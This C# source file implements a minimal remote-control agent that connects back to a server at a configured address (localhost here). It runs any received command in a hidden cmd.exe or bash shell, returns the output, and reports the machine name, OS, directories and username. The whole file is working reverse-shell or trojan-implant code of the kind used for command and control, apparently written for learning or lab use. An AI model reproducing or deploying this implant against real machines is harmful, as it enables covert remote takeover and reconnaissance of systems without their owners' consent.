using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;

/// <summary> Holds global configuration constants for the application </summary>
class AgentConstants{
    public const string SERVER_HOST = "127.0.0.1";
    public const int SERVER_PORT = 8000;
}


/// <summary> The main Agent class. Responsible for connecting back to the Server and handling received commands </summary>
class Agent {
    static bool Active;

    static void Main(string[] args){        
        Active = true;
        TcpClient Client = new TcpClient();
        Client.Connect(AgentConstants.SERVER_HOST, AgentConstants.SERVER_PORT);
        byte[] Command = new byte[65536];
        NetworkStream Stream = Client.GetStream();
        while(Active){
            int Bytes = Stream.Read(Command, 0, Command.Length);
            string CommandFinal = Encoding.ASCII.GetString(Command,0,Bytes);
            string Reply = ExecuteCommand(CommandFinal);
            byte[] ReplyBytes = Encoding.ASCII.GetBytes(Reply);
            Stream.Write(ReplyBytes, 0, Reply.Length);
            Stream.Flush();
        }
        Stream.Close();
        Client.Close();
    }

    /// <summary> Determines whether the OS is Unix-like </summary>
    /// <returns> True if OS is Unix-like, False otherwise </returns>
    /// <remarks> Based on information found here: https://www.mono-project.com/docs/faq/technical/ </remarks>
    static bool IsUnix(){
        int p = (int)Environment.OSVersion.Platform;
        return ( p == 4 || p == 6 || p == 128);
    }

    /// <summary> Executes the command received from the Server </summary>
    /// <returns> String result of the command. </returns>
    /// <remarks> Implemented commands:
    ///    1) cmd - executes a system command (cmd /c on windows, bash -c on Unix-like systems)
    ///    2) info - returns information about the system
    ///    3) quit - stops listening for commands and exits the Agent software
    /// </remarks>
    static string ExecuteCommand(string cmd){
        string[] tokens = cmd.Split(' ');
        string retValue = "";
        switch(tokens[0].ToLower()){
            case "cmd":
                string command = (string.Join(" ",tokens)).Substring(4);
                Log("command recvd: " + command);
                Process exec = new Process();
                if(IsUnix()){
                    exec.StartInfo.FileName = "bash";
                    exec.StartInfo.Arguments = "-c '" + command + "'";
                }else{
                    exec.StartInfo.FileName = "cmd.exe";
                    exec.StartInfo.Arguments = "/c " + command;
                }
                exec.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                exec.StartInfo.CreateNoWindow = true;
                exec.StartInfo.RedirectStandardOutput = true;
                exec.StartInfo.RedirectStandardError = true;
                exec.StartInfo.UseShellExecute = false;                
                exec.Start();
                exec.WaitForExit();
                retValue = exec.StandardOutput.ReadToEnd().Trim() + exec.StandardError.ReadToEnd().Trim();
            break;
            case "info":
                retValue = 
                    "Machine Name: "+ Environment.MachineName +"\n" +
                    "OSVersion: " + Environment.OSVersion +"\n" +
                    "Current Directory: " + Environment.CurrentDirectory +"\n" +
                    "System Directory: " + Environment.SystemDirectory +"\n" +
                    "Username: " + Environment.UserName +"\n" +
                    "Domain Username: " + Environment.UserDomainName +"\n" ;
            break;
            case "quit":
                retValue = "Quitting. Goodbye.";
                Active = false;
            break;
            default:
                Log("Unknown command: " + cmd);
            break;
        }
        return retValue;
    }

    static void Log(string l){
        Console.WriteLine(l);
    }
}